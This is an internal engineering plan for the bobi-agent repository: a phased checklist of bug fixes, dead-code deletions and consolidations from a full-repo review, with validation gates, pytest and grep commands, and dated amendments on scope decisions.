# Full-repo review remediation (defects + mechanical quality)

> **Status:** Approved
> **Tracking issue:** moda-labs/bobi-agent#817 · **Created:** 2026-07-22 · **Last amended:** 2026-07-26 (see Amendments)
>
> Markers: `[ ]` idle · `[wip]` in progress · `[x]` done · `[f]` failed/blocked (always with a note)

## Purpose

Clear the entire actionable backlog from the July 2026 two-pass full-repo review — every confirmed bug, dead-code item, doc-drift claim, and mechanical consolidation — as one checklist-driven initiative with the minimum number of PRs. The review produced 253 findings; after cross-pass dedup and deferring the 11 large structural refactors (which get their own successor plan — the deliberate scope cut, recorded in Notes), **229 items remain in scope here**. None of them need design: each is a verified defect with a known failure scenario or a behavior-preserving cleanup with the better shape already named.

## Problem

Two adversarially-verified review passes (281 agents; every finding re-verified by an independent agent, top items re-traced by hand) established the current state. Full per-item detail — failure scenario, evidence, verifier's trace — lives in the companion appendix **`plans/2026-07-22-review-remediation-findings.md`** (committed alongside this plan; IDs `D###` = defect pass, `Q###` = quality pass). The checklist lines below reference those IDs; the appendix is part of this plan's spec. Claims were verified against the working tree at `58aba2c` (review) and spot-re-verified at plan time; each builder re-verifies the cited lines before fixing (line numbers drift).

The highest-consequence clusters:

- **Session failure paths misreport dead transports** (D001/D002/D003/D021): a turn whose brain process dies mid-drain still ACKs the triggering message (lost on restart — the #688 class), is persisted `TERMINAL_COMPLETED` with `success=True`, and neither `stop()` nor `start()` can interrupt/detect the wedged state. Until this lands, a bot builder's own terminal signals can lie.
- **Suspended workflows emit `workflow.completed` and never auto-resume** (D005, D027; `try_resume_for_event` has no caller).
- **Installed agent packs have silently dead routing** (D015/D016/D017/D060/D119): unsupported `>` operator, out-of-scope variables, an `auto_dispatch` event type that is never emitted — the reason issue pickup currently needs a Slack directive.
- **Durable state written non-atomically** (D034/D038/D087) while the tmp+`os.replace` pattern is already re-implemented in five modules (D092).
- **41 dead-code items** including compat layers past their stated one-release windows; **34 doc-drift claims** where docs promise behavior the code does not deliver; **~60 mechanical consolidations** (missed reuse, copy-paste duplication, one-caller abstractions, conflicting house patterns).

## Solution

One plan, nine phases, executed as a small number of lanes (Q1). Phases are thematic checkpoints, not PR boundaries: a lane rips through its phases' checklists in one session/PR, flipping markers as it goes. The checklist line + appendix entry together are the per-item spec; the phase gate proves the batch. Builders re-verify each item's cited code before fixing; an item whose premise no longer holds (already fixed, code moved) is marked `[x]` with a one-line "already resolved / superseded" note rather than force-fixed — but never silently skipped.

Fix-shape ground rules (apply across all phases):

- **Bugs are failing-test-first** (house rule): reproduce, then fix. Behavior-preserving cleanups are proven by the existing suites staying green plus per-phase grep gates.
- **Deletions beat deprecation**: every expired compat shim in scope has a stated one-release window that is 4+ releases past, and verifiers confirmed zero importers (including the private deploy repo) — delete, don't re-deprecate (Q4).
- **Consolidations move code to the named house implementation** (the appendix names the survivor for each); never create a new third copy.
- **No version/changelog edits** in any lane (release rules).

Alternatives considered: per-finding tickets (253 issues — rejected: drowns the board, maximizes PR count, no shared context); fixing only high-severity (rejected: the long tail is exactly the mechanical work a bot rips through cheaply, and Zach asked for the full set); folding the structural refactors in (rejected: they need design and would poison a checklist run — successor plan).

## Relevant files

### Existing (verified 2026-07-22)

The authoritative per-item file inventory is the checklist below + appendix. Hot files touched by many items: `bobi/session.py`, `bobi/subagent.py`, `bobi/workflow/orchestrator.py`, `bobi/workflow/variables.py`, `bobi/workflow/state.py`, `bobi/cli.py`, `bobi/doctor.py`, `bobi/events/` (server/drain/adapters), `bobi/setup/webui/server.py`, `bobi/setup/state.py`, `bobi/webapp/` (+ static JS), `bobi/brain/` (claude/codex/codex_config), `bobi/monitors/` (scheduler/script_cache_checks), `bobi/compose.py`, `bobi/config.py`, `bobi/kb/`, `event-server/core/src/` (core/adapters/circuit-breaker), `event-server/src/local.ts`, `docs/*.md`, `skills/*.md`, `agents/*`, `tests/*`.

### New

- `bobi/fsutil.py` (name at builder's discretion, or an existing home like `bobi/paths.py`) — the single atomic-write helper (tmp sibling + `os.replace`, optional fsync) that Phase 3 introduces and all durable-state writers adopt. Must not become a second copy of an existing helper: survey the five existing implementations (D092) and hoist the best one.
- `plans/2026-07-22-review-remediation-findings.md` — the committed findings appendix (part of this plan).

## Questionables

- **Q1:** Lane granularity — how many PRs? Options: (a) **5 lanes**: A = Phases 1–4 (behavioral fixes, bobi/), B = Phases 5–6 (behavior-preserving cleanup, bobi/; depends on A — same files), C = Phase 7 (event-server + web UI; parallel with A), D = Phase 8 (docs; parallel), E = Phase 9 (tests; lands after A) / (b) 9 lanes, one per phase. Recommendation: (a) — C and D are genuinely parallel to A; B/E serialize behind A anyway, so extra PRs buy review granularity we don't need given per-phase gates.
  **Decision (2026-07-22, Zach):** chose (a) — 5 lanes, cut in Split below.
- **Q2:** The 17 *plausible* and 12 *unverified* findings — (a) in scope, gated on builder re-verification (drop with a dated note in the PR if refuted) / (b) exclude. Recommendation: (a) — they're all low/medium and the re-verification cost is one read each.
  **Decision (2026-07-22, Zach):** chose (a) — in scope, re-verify each before fixing; drop refuted ones with a dated PR note.
- **Q3:** `bobi setup --resume` is a documented no-op (D084/Q116) — (a) remove the flag and its help text / (b) implement resume. Recommendation: (a) — `bobi setup` now opens the webapp daemon; the flag's premise died with the old flow (`run_setup()` itself is dead, Q023).
  **Decision (2026-07-22, Zach):** chose (a) — remove the flag (Phase 5).
- **Q4:** Expired compat surfaces (curator→sleep-cycle shims Q019/Q073, policy→long_term_memory aliases Q020/Q068/Q092, `BRAIN_MODEL_ENV` Q085, `_delta_text` re-export Q079) — (a) delete now (verifiers confirmed zero importers incl. bobi-deploy) / (b) hold another release. Recommendation: (a) — the windows were stated in-code and are 4+ releases past.
  **Decision (2026-07-22, Zach):** chose (a) — delete now (Phase 5).
- **Q5:** `/api/credential/value` env fallback serves arbitrary process env vars (D077) — (a) restrict to the credential var names declared by the installed pack's services/tools / (b) remove the env fallback entirely. Recommendation: (a) — the legitimate use (showing which declared secrets are already satisfied by the environment) survives; arbitrary reads die.
  **Decision (2026-07-22, Zach):** chose (a) — restrict to declared credential var names (Phase 7).

## Phases

Every task line: builder re-verifies the appendix entry against the tree, fixes (failing-test-first where it's a bug), flips the marker in the same PR. Items tagged *(plausible/unverified — re-verify first)* per Q2.

### Phase 1 — Session failure honesty (the trust-restoring fixes)

Fix shape: `_drain_turn`'s dead-transport path must make the failure observable to callers (set `_last_is_error`/raise per the design the docstrings already claim), so ACK, terminal status, and retry decisions become honest. D001/D002 likely fall out of one mechanism — fix the mechanism, not four symptoms.

- [x] **D001** `bobi/session.py:972` — `_process_message` ACKs a message whose turn died on a dead transport; the message is lost on restart instead of replayed (violates `_ack_message`'s own #688 invariant). No-ack on dead-transport turns. *(shipped early via PR #825 + bot PR #800 to unblock headless execute — see 2026-07-22 amendment)*
- [x] **D002/Q011** `bobi/subagent.py:601` — `run_phase_blocking` (and `spawn_adhoc`, line ~784) report `success=True` and persist `TERMINAL_COMPLETED` when the startup turn's transport died mid-drain; `spawn_adhoc`'s persistent path hardcodes `success=True`. Terminal status must reflect the error state. *(shipped early via PR #825 — see 2026-07-22 amendment)*
- [x] **D003** `bobi/session.py:1214` - `stop()` no-ops when `_keep_alive` doesn't exist yet (startup turn in flight); the session thread + brain subprocess survive forever. Make stop interrupt the startup phase too.
- [x] **D021** `bobi/session.py:1205` - `start()` waits the full timeout on `_ready` even after the session thread has already died; also watch thread liveness and return early.
- [x] **D067** `bobi/subagent.py:511` - `_run_agent_supervised`'s `except asyncio.TimeoutError` is unreachable (timeout never enforced in the coroutine); enforce it or remove the dead handler honestly.
- [x] **D073** `bobi/events/drain.py:349` - `monitor.error` inbox pushes omit `on_done=batch_ack.attach()`, ACKing their event seq at push time instead of after processing; attach the completion callback like every other push site. *(already resolved on main by PR #800 / commit 72aadce - re-verified 2026-07-25, the push site already carries `on_done=batch_ack.attach()`; not re-fixed)*

**Validation gate** — do not exit this phase until every line passes; if a command fails, fix the cause and re-run.

- [x] New regression tests, written failing-first: dead-transport turn does NOT advance the ack cursor; dead-transport phase persists `TERMINAL_FAILED`/`session.failed`; `stop()` during a hung startup turn tears the session down; `start()` returns promptly when the thread dies
- [x] `pytest tests/ --ignore=tests/integration --ignore=tests/e2e --timeout=60 -q` (3817 passed, 1 skipped - 2026-07-27)
- [x] `pytest tests/integration -q -k "session or subagent or drain"` - 55 passed, 1 skipped, 1 failed (2026-07-27). The failure is `test_promptless_connect_has_no_turn_to_drain`, which fails identically on `main` at `242a4641` (same `DID NOT RAISE TimeoutError`) - re-run there to confirm, not inherited from the PR body's claim
- [x] Real-Claude e2e leg (`[stub]+[claude]` parametrization per CLAUDE.md) for the dead-transport ack/terminal path - this is brain-path risk, the claude leg is required. Run 2026-07-27 with `BOBI_RUN_CLAUDE_TESTS=1`: `tests/integration/test_session_drain_honesty.py` -> **4 passed, 0 skipped** (2 mechanisms x 2 brains), so the claude leg genuinely executed rather than skipping

### Phase 2 — Workflow engine + agent-pack routing correctness

**Mostly superseded 2026-07-26** by `plans/2026-07-26-checklist-execution-model.md`, which deletes the workflow step machine (steps, handoff contracts, route conditions, await/resume). Nine items below fix internals scheduled for deletion and are `[f]`-superseded; **three survive and remain in scope** because they are not step-machine code — see the dated Amendment. Item-level rationale is on each line.

**Phase 2 status note (2026-07-26).** Lane A fixed these items *before* the
checklist plan's Q1 descope reached `main`. The markers record what is true of
the code - the fixes exist, each with a failing-test-first - and every
superseded line carries the descope context, because Phase 4 of
`plans/2026-07-26-checklist-execution-model.md` deletes the surface it fixes.
Reverting working, tested code to honor a "do not spend effort here" decision
would be a second waste; these stand until the cutover removes their subject.
The condition-parser work in particular is load-bearing *today*: it is what
makes `issues_count > 0` route at all, and it fixes a live crash (a value
containing a regex escape raised `re.error` out of `evaluate_condition`).
See the 2026-07-26 amendment.

- [x] **D005** `bobi/workflow/orchestrator.py:231` — suspended (await) run emits `agent/workflow.completed`: suspend returned `True` and both callers treated `True` as terminal success. Returns a distinct suspend outcome; emits nothing terminal. *Superseded going forward 2026-07-26: the checklist plan deletes `await`/suspend.*
- [f] **D027** `bobi/workflow/orchestrator.py:88` — `try_resume_for_event` claims the run before checking the workflow still exists; and nothing calls it (D018). **(a) claim-before-existence-check FIXED. (b) wiring ESCALATED** — caller graph re-verified, still referenced only by its definition, tests, and `docs/WORKFLOW_ENGINE.md`. *Resolved 2026-07-26: the escalation is answered — the checklist plan deletes the await/resume feature rather than wiring it (its Problem 8 records this was a missing wire, not a wrong architecture; the decision is removal). Stays `[f]`: the feature is dead until the cutover removes it.*
- [x] **D024** `bobi/workflow/orchestrator.py:314` — launch-time `--role` override and agent identity lost across suspend/resume; persisted on the run and passed through `resume_workflow`. *Superseded going forward 2026-07-26: no suspend/resume to lose it across.*
- [x] **D029** `bobi/workflow/orchestrator.py:546` — `_make_session` exception in the initial connect loop escaped both the retry try and the terminal-honesty try/finally, leaving the registry entry stuck `running`. **SURVIVES the cutover and is load-bearing:** the checklist plan's in-progress monitor resolves ownership from live registry entries (its Q3), so an entry stuck `running` makes a dead unit look permanently alive and blocks re-dispatch forever.
- [x] **D025** `bobi/workflow/orchestrator.py:848` — stale handoff files not cleared before a prompt step; a failed turn validated against the previous visit's handoff. *Superseded going forward 2026-07-26: handoff files are deleted.*
- [x] **D028** `bobi/workflow/orchestrator.py:873` — non-mapping handoff YAML (string/list) crashed with AttributeError instead of entering the missing-fields re-prompt path. *Superseded going forward 2026-07-26: handoff files are deleted.*
- [x] **Q017/D026** `bobi/workflow/variables.py:92` — route conditions resolved by textual substitution into the expression before parsing (multi-word values broke the grammar, and a value containing a regex escape crashed `evaluate_condition`); resolved inside the parser, with numeric comparison operators added. *Superseded going forward 2026-07-26: route conditions are deleted — but `${{}}` interpolation may survive, and Phase 4 re-verifies consumers before deleting `variables.py`.*
- [x] **D015** `agents/dogfood-content-review/workflows/dogfood-content-review.yaml:35` — `issues_count > 0` used the unsupported `>` (fix step never routed); fixed by the parser extension above, with the route verified to take. *Superseded going forward 2026-07-26: this workflow migrates to a checklist.*
- [x] **D016** `agents/eng-team/workflows/pr-closed.yaml:14` — `merged == true` referenced bare `merged`, never in flat scope (arrives as `input.merged`). *Superseded going forward 2026-07-26: `pr-closed.yaml`'s deterministic pieces become checklist items naming commands.*
- [x] **D017** `agents/eng-team/agent.yaml:126` — `auto_dispatch` rule `event: github.issues.assigned` matched a type never emitted (adapter emits `github.issues` with the action in fields); rule fixed to match reality, plus a validate-time check for unmatchable event types. **SURVIVES:** this is event→dispatch routing (`bobi/workflow/triggers.py` is explicitly KEPT by the checklist plan), and issue pickup needs a Slack directive until it lands.
- [x] **D060** `agents/dogfood-content-review/roles/manager/ROLE.md:16` — routing table dispatched workflows `pr-feedback`/`pr-merged` that do not exist in the pack; table corrected. *Superseded going forward 2026-07-26: Phase 4 rewrites every pack's routing surface. If the cutover is abandoned, this correction is already in place.*
- [x] **D119** `agents/dogfood-content-review/agent.yaml:4` — declared `chat: slack` and routed "Slack DM" events with no slack service declared. Resolved **downward** (no chat surface + the email surface it actually subscribes to; spelled as an ABSENT `chat:` key, not `chat: cli` - corrected 2026-07-27), keeping dogfood credential-free as the release-smoke pack — Zach's decision, 2026-07-26. **SURVIVES:** pack/service declaration consistency, unrelated to the step machine.

**Validation gate**

Rewritten 2026-07-26 to prove the three surviving items (D029, D017, D119), then **restored 2026-07-27** for the nine the merge resolved to `[x]`. The rewrite had been written against the descope, and it outlived it: the nine were already fixed failing-test-first, so a gate that withdrew their proof lines left the plan asserting fixes it no longer recorded any proof for - and this plan's own Proof-of-work says every Phase 1-4 bug gets a failing test first. Recording what exists costs nothing; the surface still goes when the cutover removes it.

- [x] Failing-first test (**D029**): a `_make_session` exception in the initial connect loop leaves the registry entry **terminal**, never stuck `running` - asserted on the surviving spawn path, because the in-progress monitor's ownership check depends on it
- [x] Failing-first test (**D017**): an `auto_dispatch` rule whose `event:` can never be emitted fails validation; and the corrected rule actually matches a real `github.issues` payload with the action in fields
- [x] Failing-first test (**D119**): a pack declaring `chat: slack` with no slack service fails validation; plus the end state asserted positively (`test_this_pack_ships_with_no_chat_surface_at_all`), since the first check early-exits for the value the pack now ships
- [x] Failing-first tests for the nine the merge kept (**D005, D024, D025, D028, Q017/D026, D015, D016, D060**): suspend returns a distinct outcome and emits nothing terminal; `--role`/identity survives resume; a stale handoff is cleared before a prompt step; non-mapping handoff YAML re-prompts instead of raising; the condition parser resolves `${{scope.key}}` inside the parser, adds numeric comparisons, and no longer raises `re.error` on a value carrying a regex escape; `issues_count > 0` routes against the real pack workflow; `merged == true` reads `input.merged`; the dogfood routing table names only workflows that exist
- [x] `pytest tests/ --ignore=tests/integration --ignore=tests/e2e --timeout=60 -q && pytest tests/integration -q -k "workflow or orchestrator"`
- [x] `bobi validate` (or the validate suite) passes on all three `agents/` packs with the new unmatchable-event check active

### Phase 3 — Persistence atomicity (one helper, all writers)

- [x] **D092** `bobi/workflow/state.py:36` - hoist the atomic-write pattern (5 existing re-implementations, appendix lists them) into ONE helper; all five sites adopt it.
- [x] **D034** `bobi/setup/state.py:231` - `SetupState.save` bare `write_text`, no locking, concurrent FastAPI threadpool handlers; adopt the helper + a lock.
- [x] **D038** `bobi/brain/codex_config.py:214` - `write_codex_config` non-atomic rewrite of `$CODEX_HOME/config.toml` (crash = foreign entries lost); adopt the helper.
- [x] **D087** `bobi/spend_governor.py:83` - `record_invocation` unlocked read-modify-write of spend_governor.json; adopt helper + file lock.
- [x] **Q062/D071** `bobi/workflow/state.py:89` - `claim()` writes the temp file before the atomic claim, leaving a crash window that makes the run permanently unresumable; reorder per the appendix trace.
- [x] **Q039** `bobi/monitors/scheduler.py:1470` - durable JSON persisted in two conflicting styles within the same subsystem; converge on the helper (house pattern).

**Validation gate**

- [x] Helper unit tests incl. a crash-window test (kill between tmp write and replace -> old state intact), plus symlinked-target coverage added 2026-07-27
- [x] `grep -rn "write_text" bobi/ | grep -iE "state|config\.toml|governor"` shows no remaining bare durable-state writes. **Survivors, all justified:** single-scalar pid/port/version stamps (`service.py` manager.pid, `webui_common/launcher.py` ui.port, `events/server.py` event-server.port x2, `state_version.py`) - one short line, nothing to tear - and `config.py save_deployment_state`, a real bare serialized write carried on the `NOT_CONVERGED` deny list as known debt for Lane B. The 2026-07-27 round converted the four the guard had been unable to SEE (`setup/authoring.py` x2, `cli.py` x2, `setup/webui/server.py`)
- [x] `pytest tests/ --ignore=tests/integration --ignore=tests/e2e --timeout=60 -q` (3817 passed, 1 skipped - 2026-07-27)

### Phase 4 — bobi/ bug batch (each independent; failing-test-first)

- [x] **D009** `bobi/brain/codex.py:369` - CodexBrain.make_session clears the bobi-managed mcp_servers block from $CODEX_HOME/config.toml whenever a call site omits options['mcp_servers'],… **[Lane A 2026-07-25: the over-clearing is FIXED - an omitted `mcp_servers` key no longer rewrites the machine-global config.toml. A RESIDUAL gap remains and is escalated, not patched: a team that DROPS its servers never cleans up its own stale block. Resolving it via a team-config lookup was implemented and reverted as unsafe; see the 2026-07-25 amendment and `test_omitted_mcp_option_is_not_resolved_from_the_installed_team`.]**
- [x] **D041** `bobi/build_render.py:237` - The image-build `verify: requires` step sets BOBI_VERIFY_PHASE as an unexported shell variable (`BOBI_VERIFY_PHASE=build; <check>`), so any check…
- [ ] **Q122/D064** `bobi/cli.py:789` - `bobi setup --resume` is parsed, documented in help ('Resume an interrupted setup'), then immediately discarded with `del resume`. *(unverified - re-verify first)* **[Lane A 2026-07-25: re-verified, premise still holds - `--resume` is parsed, documented in `--help`, then `del resume`; it does not crash, so nothing was in Phase 4 scope. Q3 assigns the flag REMOVAL to Phase 5, so Lane B owns it. Note for Lane B: `tests/test_cli.py::TestSetupCommand::test_help` and `::test_setup_options_are_accepted_for_compatibility` pin the current surface, and `bobi/setup/__init__.py` still carries a `resume` param.]**
- [x] **D018** `bobi/cli.py:2710` - `bobi agent <name> event-server stop` crashes with an unhandled traceback on a corrupt/empty event-server.pid and on PermissionError, instead of…
- [x] **D066** `bobi/cli.py:3019` - `bobi agents update` (update-all path) exits 0 even when every pack update fails, so scripts/CI cannot detect failure.
- [x] **D065** `bobi/cli.py:3110` - `bobi agents browse` crashes with 'Unknown format code s' when a registry.yaml declares an unquoted numeric version (e.g. version: 1.0), because the…
- [x] **D039** `bobi/compose.py:659` - _merge_keyed_list crashes with a raw TypeError when an overlay list removes and re-adds the same keyed entry, because the tombstone (None) left at…
- [x] **D040** `bobi/compose.py:767` - _prune_one performs no validation of prune names, so an absolute path or `..` in a `prune:` entry deletes files/directories outside the compose…
- [x] **D085** `bobi/config.py:500` - Config._parse crashes on null-valued YAML keys: `event_server:` with an empty value raises AttributeError (None.get) and `spend_cap:` raises…
- [x] **D086** `bobi/costs.py:183` - rollup_costs guards token fields against non-numeric values via _tok but not the cost fields, so a string total_cost_usd (or cost_usd) in one…
- [x] **D020** `bobi/doctor.py:35` - run_doctor unconditionally runs the Claude CLI and Claude auth checks as required failures, so doctor reports broken health (exit 1) on hosts running…
- [x] **D019** `bobi/doctor.py:386` - _check_event_server probes hardcoded http://localhost:8080, producing a false required failure (doctor exit 1) for remote-configured instances that…
- [x] **D075** `bobi/events/adapters.py:106` - _parse_github_url uses a substring match for 'github.com', so GitHub Enterprise hosts like github.company.com are mis-parsed into a garbage org/repo…
- [x] **D031** `bobi/events/server.py:706` - register_slack_workspaces ignores the HTTP status of the signed POST /slack/workspaces and logs success (returning [team_id]) even when the server…
- [x] **D069** `bobi/history.py:188` - _project_from_path replaces every '-' with '/', mangling project names for any repo with a hyphen in its name (including bobi-agent itself), which…
- [x] **D022** `bobi/history.py:262` - _index_file counts a trailing partially-written JSONL line as read, so once the writer completes that line it is never indexed - the message is…
- [x] **D068** `bobi/history.py:316` - _fts_query breaks on queries containing a double quote (or an all-whitespace query), producing invalid FTS5 syntax that raises…
- [x] **D010** `bobi/kb/embedder.py:127` - embed()'s dead-sidecar recovery catches OSError, but the pooled httpx client raises httpx.ConnectError (not an OSError subclass), so the…
- [x] **D043** `bobi/kb/store.py:127` - _fts_query wraps each whitespace token in double quotes without escaping embedded double quotes, so any query token containing an odd number of '"'…
- [x] **D045** `bobi/manager_health.py:30` - The health endpoint uses a single-threaded HTTPServer with no handler timeout, so one half-open or stalled client connection blocks /health and…
- [x] **D004** `bobi/monitors/script_cache_checks.py:978` - script_cache self-heal invokes the blocking agent runtime synchronously on the single scheduler thread, stalling every other monitor for minutes.
- [x] **D023** `bobi/monitors/tool_checks.py:151` - tool_poll/venn_poll cache the resolved command keyed only on monitor name with no config fingerprint, so editing a monitor's command/query keeps…
- [x] **D032** `bobi/registry.py:221` - fetch() for an unpinned team silently downgrades 'latest published version' to the rolling main-push tarball when the remote version read transiently…
- [x] **D044** `bobi/runtime_guard.py:242` - with_mutable_runtime_package runs the strict +w sweep before entering its try/finally, so an EPERM partway through the unlock leaves every…
- [x] **D035** `bobi/setup/actions.py:361` - install_team only enforces the validated/hash-freshness gate when state.mode == 'create', so open/modify-mode teams can be installed from unvalidated…
- [x] **D036** `bobi/setup/authoring.py:296` - merge_agent_yaml claims chat is a setup-managed overlay key but never removes or overwrites an existing `chat:` when the user switches the team to…
- [x] **D033** `bobi/setup/webui/server.py:637` - _resolve_pending writes a pre-probe snapshot of the MCP entry back into state.spec.mcp_servers after an up-to-60s await, silently reverting any edit…
- [x] **D007** `bobi/setup/webui/server.py:953` - /api/mcp/detect (and the /api/browse folder picker) confine paths to BOBI_HOME (~/.bobi by default), not the user's home directory the comments and…
- [x] **D081** `bobi/setup/webui/server.py:1284` - GET /api/credential/value falls back to os.environ for any requested var name, so the endpoint serves arbitrary process environment variables (AWS…
- [x] **D080** `bobi/setup/webui/server.py:1373` - GET /api/file calls target.read_text() with no decode-error handling, so any non-UTF-8 file in the pack (which /api/files happily lists) makes the…
- [x] **D076** `bobi/slack.py:170` - format_slack_message blanket-replaces literal \n/\t escape sequences across the whole message, including inside code fences, corrupting quoted…
- [x] **D074** `bobi/slack_manifest.py:39` - render_manifest substitutes the user-supplied app name unescaped into unquoted YAML scalar positions, so names containing YAML-special characters…
- [x] **D042** `bobi/tool_library.py:168` - resolve_dependencies de-dupes by name with FIRST occurrence winning while the tool_library union appends leaf entries after base entries, so a leaf…
- [x] **D084** `bobi/tool_library.py:225` - The dependency-guide leaf-wins check (`if not guide_path.exists()`) mistakes a stale guide from a previous install for a team-shipped file, so…
- [x] **D037** `bobi/webapp/daemon.py:191` - daemon stop() sends SIGTERM/SIGKILL to the pid from a possibly-stale pidfile without confirming it is the bobi app, so pid reuse causes it to kill an…

**Validation gate**

- [x] Every item above has a test that failed before its fix (or an `[x]`-with-note where re-verification refuted it) - asserted by the build session per item; the 2026-07-27 gate round re-established failing-first individually only for the items it touched (D040's prune, D037's pid identity, D081's confinement, D092's helper), not for all 34
- [x] `pytest tests/ --ignore=tests/integration --ignore=tests/e2e --timeout=60 -q` (3817 passed, 1 skipped - 2026-07-27); `pytest tests/integration -q` reduced to the two gated subsets below rather than the whole suite, which needs a bound runtime root this environment does not provide

### Phase 5 — Dead-code purge (deletions only; grep-gated)

Includes Q4's expired compat layers and Q3's flag removal once decided. For config keys parsed-but-never-read (Q022: `registries`/`default_role`/`chat`): delete the parse OR wire the read — deleting is the default unless Phase 2's D119 fix gave `chat:` a real consumer.

- [ ] **Q080** `bobi/brain/__init__.py:105` — The public BRAIN_MODEL_ENV compatibility alias has zero importers in the repo, tests, and the private deploy repo.
- [ ] **Q078** `bobi/brain/claude.py:27` — BrainCapabilities is imported but unused in both brain/claude.py and brain/codex.py — a #789 refactor leftover.
- [ ] **Q077** `bobi/brain/claude.py:125` — The trailing `if last_error is not None: raise last_error` after the connect retry loop is unreachable.
- [ ] **D061** `bobi/cli.py:348` — _list_agent_packs in cli.py is a byte-for-byte duplicate of service.py's _list_agent_packs, and the cli copy is dead code.
- [ ] **D062** `bobi/cli.py:958` — Dead helpers _find_pid_path (line 948), _stop_manager_pid (line 958) and _run_from_config (line 364) duplicate the live stop/start paths in…
- [ ] **Q008** `bobi/cli.py:1594` — Six unreachable `if not project_path:` guards / else-branches follow `_detect_project_root()` (or `paths.home_dir()`), which can never return a falsy…
- [ ] **Q032** `bobi/config.py:317` — Config fields `registries`, `default_role`, and `chat` are parsed from agent.yaml but never read by any production code.
- [ ] **Q125** `bobi/config.py:409` — Config.brain_small_model property has zero callers — the one real consumer bypasses it and reads the raw brain dict. *(unverified — re-verify first)*
- [ ] **Q038** `bobi/config.py:510` — Config.default_role is parsed from agent.yaml's `defaults.role` but never read by anything, so the key is silently ignored.
- [ ] **Q045** `bobi/doctor.py:517` — `_check_policy` is a self-described 'deprecated compatibility wrapper for one release' with zero production callers, several releases after the…
- [ ] **Q053** `bobi/history.py:15` — SESSIONS_DIR module constant is never referenced.
- [ ] **Q013** `bobi/history.py:447` — context_for_events (49 lines) has zero production callers — only tests exercise it.
- [ ] **Q048** `bobi/history.py:498` — start_background_indexer has zero callers anywhere in the repo, including tests.
- [ ] **Q052** `bobi/inbox.py:102` — Inbox._closed is written in __init__ and close() but never read anywhere.
- [ ] **Q094** `bobi/kb/store.py:174` — KBStore.kb_dir() and KBStore.db_path_for() static methods have zero callers in the repo, including tests.
- [ ] **D083** `bobi/mcp/__init__.py:1` — bobi/mcp is an empty leftover package whose docstring claims 'Built-in MCP servers shipped with bobi' while it contains no servers and nothing…
- [ ] **Q121** `bobi/memory.py:169` — reference_memory_path() has zero callers; the one place that needs the reference.md path (monitors/scheduler.py:1126) hand-builds it inline instead. *(unverified — re-verify first)*
- [ ] **Q030** `bobi/memory.py:381` — The policy->long_term_memory deprecation aliases (memory.MAX_POLICY_CHARS/load_policy/format_policy_prompt, paths.policy_path/policy_cursor_path,…
- [ ] **Q014** `bobi/monitors/scheduler.py:567` — The rest of the curator→sleep-cycle compat layer is five releases past its stated one-release window: _default_spawn_curator (567), the spawn_curator…
- [ ] **Q055** `bobi/monitors/scheduler.py:1097` — Three deprecated curator wrappers — _load_curator_prompt (1097), _on_curator_result (1414), _publish_policy_updated (1452) — have zero callers…
- [ ] **Q057** `bobi/monitors/script_cache_checks.py:1046` — approve_pending's scripts_dir parameter is never read — the body resolves all paths via _pending_path/_pin/_scripts_dir — yet tests pass a directory…
- [ ] **Q095** `bobi/paths.py:91` — paths.agent_runtime_root is a pure alias of agent_run_root with zero callers.
- [ ] **Q118** `bobi/paths.py:183` — compose_lock_path() has zero callers; every compose-lock consumer builds `<dest>/compose-lock.json` inline against its own base dir. *(unverified — re-verify first)*
- [ ] **Q119** `bobi/paths.py:282` — worktrees_dir() points at state_dir()/worktrees, a location nothing in the codebase uses — workflow worktrees actually live under the repo's… *(unverified — re-verify first)*
- [ ] **Q102** `bobi/prompts/resolver.py:194` — _load_policy_section() is a private 'deprecated alias for one release' with zero callers — a private name cannot serve external compat, so it was…
- [ ] **Q081** `bobi/sdk.py:42` — TERMINAL_STATUSES tuple is defined but never read anywhere.
- [ ] **Q079** `bobi/sdk.py:71` — Module constant CLAUDE_CLI has zero readers anywhere and forces a shutil.which() at import time.
- [ ] **Q113** `bobi/sdk.py:198` — sdk.state_dir() wrapper (delegating to paths.state_dir) has zero callers. *(plausible — re-verify first)*
- [ ] **Q082** `bobi/sdk.py:456` — SessionRegistry.log_path's only caller is its own unit test.
- [ ] **Q031** `bobi/service.py:709` — service.restart_team has zero callers anywhere in the repo, including tests.
- [ ] **Q054** `bobi/session.py:17` — session.py imports hashlib (line 17) and Path (line 22) but uses neither.
- [ ] **Q037** `bobi/setup/__init__.py:19` — run_setup() has zero callers; the `bobi setup` CLI command now opens the webapp daemon URL instead, leaving the setup package's only public entry…
- [ ] **Q120** `bobi/setup/actions.py:108` — default_secret_prompt() — a click-based masked terminal prompt — has zero callers since setup became web-UI-driven. *(unverified — re-verify first)*
- [ ] **Q065** `bobi/setup/actions.py:161` — installed_team_name has no production callers — only its own unit tests reference it.
- [ ] **Q066** `bobi/setup/actions.py:173` — resolve_or_fetch has no production callers — only its own unit tests reference it.
- [ ] **Q067** `bobi/setup/authoring.py:614` — _env_var_fallback is an unreachable fallback: the `conn.credential_var or _env_var_fallback(...)` branch in tools_prompt can never fire.
- [ ] **Q068** `bobi/setup/llm.py:23` — The _delta_text re-export from bobi.brain.claude exists only so a test can import it from the old location; no production code uses llm._delta_text.
- [ ] **Q049** `bobi/subagent.py:658` — _load_policy_prompt, the 'deprecated alias for one release' from the policy→long_term_memory rename, has zero callers and has outlived several…
- [ ] **Q050** `bobi/subagent.py:1687` — _parse_check_output is a back-compat shim with zero production callers, while run_check_blocking re-inlines its exact verdict→(finding, summary,…
- [ ] **Q086** `bobi/validate.py:77` — ValidationResult.errors property has zero callers anywhere.
- [ ] **Q059** `bobi/workflow/orchestrator.py:592` — failed_step is assigned at 7 sites in _run_workflow_async and never read; the Any and AgentResult imports are also unused.

**Validation gate**

- [ ] For every deleted name: `grep -rn "<name>" bobi/ tests/ agents/ docs/ skills/ event-server/` returns nothing (or only the changelog-adjacent mention the PR itself adds)
- [ ] `pytest tests/ -q` (full suite incl. integration) green with zero test edits other than deleting tests of deleted code

### Phase 6 — Consolidations & simplifications (behavior-preserving)

Each appendix entry names the surviving implementation — move callers to it; never mint a third copy.

- [ ] **Q012** `bobi/auth_bootstrap.py:192` — auth_bootstrap._parse_conversation hand-rolls the conversation-ref grammar that bobi.conversation.parse_conversation already implements.
- [ ] **Q083** `bobi/brain/__init__.py:231` — GATEWAY_UNRESOLVED_BASE_URL lives in brain/__init__.py, forcing gateway.py's require_gateway_base_url into a function-level circular-import…
- [ ] **Q026** `bobi/brain/base.py:148` — stream_once is part of the de facto BrainFactory contract but is missing from the Protocol and unimplemented by CodexBrain, so the brain interface is…
